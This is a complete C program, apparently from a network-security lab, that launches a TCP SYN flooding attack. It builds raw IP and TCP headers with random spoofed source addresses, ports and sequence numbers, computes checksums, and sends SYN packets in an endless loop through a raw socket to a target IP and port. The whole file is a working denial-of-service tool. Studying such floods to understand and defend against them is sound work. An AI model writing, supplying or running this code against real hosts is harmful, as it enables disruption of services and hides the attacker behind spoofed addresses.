#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <time.h>

#define PACKET_LEN 4096
#define TH_SYN 0x02

/* IP Header */
struct ipheader
{
    unsigned char      iph_ihl:4, //IP header length
                       iph_ver:4; //IP version
    unsigned char      iph_tos; //Type of service
    unsigned short int iph_len; //IP Packet length (data + header)
    unsigned short int iph_ident; //Identification
    unsigned short int iph_flag:3, //Fragmentation flags
                       iph_offset:13; //Flag offset
    unsigned char      iph_ttl; //Time to Live
    unsigned char      iph_protocol; //Protocol type
    unsigned short int iph_chksum; //IP datagram checksum
    struct in_addr     iph_sourceip; //Source IP address
    struct in_addr     iph_destip; //Destination IP address
};

/* TCP Header */
struct tcpheader
{
    unsigned short int tcp_sport; // Source port
    unsigned short int tcp_dport; // Destination port
    unsigned int       tcp_seq; // Sequence number
    unsigned int       tcp_ack; // Acknowledgment number
    unsigned char      tcp_offx2; // Data offset, rsvd
    unsigned char      tcp_flags; // Control flags
    unsigned short int tcp_win; // Window
    unsigned short int tcp_sum; // Checksum
    unsigned short int tcp_sun; // Urgent pointer
};

/* Pseudo TCP header */
struct pseudo_tcp
{
    unsigned saddr, daddr;
    unsigned char mbz;
    unsigned char ptcl;
    unsigned short tcpl;
    struct tcpheader tcp;
    char payload[PACKET_LEN];
};

unsigned short calculate_tcp_checksum(struct ipheader *ip);
unsigned short in_cksum(unsigned short *buf, int length);
void send_raw_ip_packet(struct ipheader* ip, const char* interface);

int main(int argc, char *argv[]) {
    if (argc != 7 || strcmp(argv[1], "-i") != 0 || strcmp(argv[3], "-d") != 0 || strcmp(argv[5], "-p") != 0) {
        fprintf(stderr, "Usage: %s -i <interface> -d <destination_ip> -p <destination_port>\n", argv[0]);
        return 1;
    }

    char buffer[PACKET_LEN];
    struct ipheader *ip = (struct ipheader *) buffer;
    struct tcpheader *tcp = (struct tcpheader *) (buffer + sizeof(struct ipheader));

    // Parse command line arguments
    const char* interface = argv[2];
    char *dest_ip = argv[4];
    int dest_port = atoi(argv[6]);

    printf("Starting the SYN flooding attack from the %s interface...\n", interface);

    srand(time(0)); // Initialize the seed for random # generation.
    while(1) {
        memset(buffer, 0, PACKET_LEN);

        // Fill in the TCP header.
        tcp->tcp_sport = rand(); // Use random source port
        tcp->tcp_dport = htons(dest_port);
        tcp->tcp_seq = rand(); // Use random sequence #
        tcp->tcp_ack = 0; // Acknowledgment number
        tcp->tcp_offx2 = 0x50;
        tcp->tcp_flags = TH_SYN; // Enable SYN bit
        tcp->tcp_win = htons(20000);
        tcp->tcp_sun = 0;

        // Fill in the IP header
        ip->iph_ver = 4; // Version (IPv4)
        ip->iph_ihl = 5; // Header length
        ip->iph_ttl = 50; // Time to live
        ip->iph_sourceip.s_addr = rand(); // Use a random IP address
        ip->iph_destip.s_addr = inet_addr(dest_ip);
        ip->iph_protocol = IPPROTO_TCP; // The value is 6
        ip->iph_len = htons(sizeof(struct ipheader) + sizeof(struct tcpheader));

        // Calculate tcp checksum
        tcp->tcp_sum = calculate_tcp_checksum(ip);

        // Send the spoofed packet
        send_raw_ip_packet(ip, interface);
    }
    return 0;
}

unsigned short calculate_tcp_checksum(struct ipheader *ip)
{
    struct tcpheader *tcp = (struct tcpheader *) ((unsigned char *)ip + sizeof(struct ipheader));

    int tcp_len = ntohs(ip->iph_len) - sizeof(struct ipheader);

    /* pseudo tcp header for the checksum computation */
    struct pseudo_tcp p_tcp;
    memset(&p_tcp, 0x0, sizeof(struct pseudo_tcp));

    p_tcp.saddr = ip->iph_sourceip.s_addr;
    p_tcp.daddr = ip->iph_destip.s_addr;
    p_tcp.mbz = 0;
    p_tcp.ptcl = IPPROTO_TCP;
    p_tcp.tcpl = htons(tcp_len);
    memcpy(&p_tcp.tcp, tcp, tcp_len);

    return (unsigned short) in_cksum((unsigned short *)&p_tcp, tcp_len + 12);
}

unsigned short in_cksum(unsigned short *buf, int length) // this function calculates the checksum for a given buffer.
{
    unsigned short *w = buf;
    int nleft = length;
    int sum = 0;
    unsigned short temp=0;

    /*
     * The algorithm uses a 32 bit accumulator (sum), adds sequential 16 bit words to it, and at the end, folds back all
     * the carry bits from the top 16 bits into the lower 16 bits.
    */
    while (nleft > 1) {
        sum += *w++;
        nleft -= 2;
    }

    /* treat the odd byte at the end, if any */
    if (nleft == 1) {
        *(unsigned char *) (&temp) = * (unsigned char *)w ;
        sum += temp;
    }

    /* add back carry outs from the top 16 bits to low 16 bits */
    sum = (sum >> 16) + (sum & 0xffff); // add high 16 to low 16
    sum += (sum >> 16);
    return (unsigned short) (~sum);
}

void send_raw_ip_packet(struct ipheader* ip, const char* interface)
{
    struct sockaddr_in dest_info;
    int enable=1;

    // Step 1: Create a raw network socket.
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

    // Step 2: Set socket option.
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));

    // Step 3: Provide needed information about the destination.
    dest_info.sin_family = AF_INET;
    dest_info.sin_addr = ip->iph_destip;

    // Step 4: Set the network interface
    if (setsockopt(sock, SOL_SOCKET, SO_BINDTODEVICE, interface, strlen(interface)) < 0) {
        perror("Error setting interface");
        close(sock);
        return;
    }

    // Step 5: Send the packet out.
    sendto(sock, ip, ntohs(ip->iph_len), 0, (struct sockaddr *)&dest_info, sizeof(dest_info));

    // Step 6: Close the socket
    close(sock);
}
